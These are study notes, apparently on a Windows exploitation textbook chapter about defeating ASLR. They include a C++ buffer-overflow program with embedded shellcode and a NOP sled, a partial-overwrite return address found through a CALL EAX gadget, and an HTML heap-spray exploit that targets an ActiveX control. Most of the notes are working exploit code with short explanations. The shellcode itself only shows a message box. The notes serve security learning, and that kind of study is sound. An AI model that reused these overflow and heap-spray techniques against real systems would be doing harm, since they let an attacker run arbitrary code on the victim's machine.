# notes about chapter13
## from 13.2 攻击未启用 ASLR 的模块
## from 13.3 利用部分覆盖进行定位内存地址
codes:

```C++
#include<string.h>
#include"stdlib.h" 
char shellcode[]=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"//168

"\x90\x90\x90\x90\x90\x90\x90\x90"//176
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"//256
"\x90\x90\x90\x90"

"\x90\x90"
;
char * test()
{
	char tt[256]; 
	memcpy(tt,shellcode,262); 

	_asm int 3;
	return tt;
}
int main()
{
	char temp[200]; 
	test();
	return 0;
}

```

覆盖完成后：

eax->shellcode起始地址：

![](./dbg1.JPG)

由于aslr只是让基址进行了随机化，所以可以用off by one的思路将地址的后两个字节覆盖，从而运行在随机化的基址基础上的偏移的指令，此时覆盖了最后两个字节：

![](./dbg2.JPG)

所以只要在能覆盖的地址范围内找到类似jmp eax的指令即可。

找到的指令：  
```
Log data, 条目 742
 地址=000A141C
 消息=Found  CALL EAX at 0xa141c     Module:  C:\Users\admin\Desktop\0day\exp398\Release\exp398.exe

```

使用第一个"\x1C\x14"即可。

![](./success1.JPG)

## 13.4  利用 Heap spray 技术定位内存地址
```html
<html>
	<body>

		<script>
		var nops = unescape("%u9090%u9090");
		var shellcode=
	"\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";

		while (nops.length < 0x100000)
			nops += nops;
		nops=nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length); nops=nops+shellcode;
		var memory = new Array(); 
		for (var i=0;i<200;i++)
			memory[i] += nops;
		</script>

		<object classid="clsid:DA30E427-9F4A-4353-A2D8-178BC2EEE6EC" id="test"> </object>

		<script>
		var s = "\u9090";
		while (s.length < 54) { s += "\u9090";
		} 
		s+="\u0C0C\u0C0C";
		test.test(s);
		</script>

	</body>
</html>
```

## 13.5  利用 Java applet heap spray 技术定位内存地址

## 13.6 为 .NET 控件禁用ASLR